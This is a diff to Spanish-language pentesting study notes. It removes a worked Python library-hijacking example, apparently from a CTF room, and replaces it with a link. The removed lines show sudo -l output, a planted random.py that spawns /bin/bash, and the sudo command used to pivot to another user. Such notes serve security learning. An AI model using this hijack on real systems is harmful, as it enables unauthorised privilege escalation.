@@ -51,27 +51,5 @@ O establecer una reverse shell.
 ```
 
 ### CASO 4 (Script python que importa librería) (Library Hijacking)
-Ejemplo, al hacer sudo -L vemos que un usuario puede ejecutar un script en python, y vamos a pivotar a ese usuario.
-```bash
-aliceawonderland:-$ sudo -l 
-
-User alice may run the following commands on wonderland: (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
-```
-
-Teniendo ese script en python, que no podemos editar, pero importa una librería:
-```python
-import random
-
-resto del script
-```
-
-Si creamos un **random.py** en el mismo directorio que el script, este script al importar random, en realidad está importando nuestro random.py. Con lo que podemos introducir en random.py el siguiente código:
-```python
-import os
-os.system("/bin/bash")
-```
-
-Luego basta con:
-```bash
-sudo -u <rabbit> /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
-```
+#### MEJOR MIRAR SECCIÓN LIBRARY HIJACKING
+![[10 - Python Library Hijacking]]
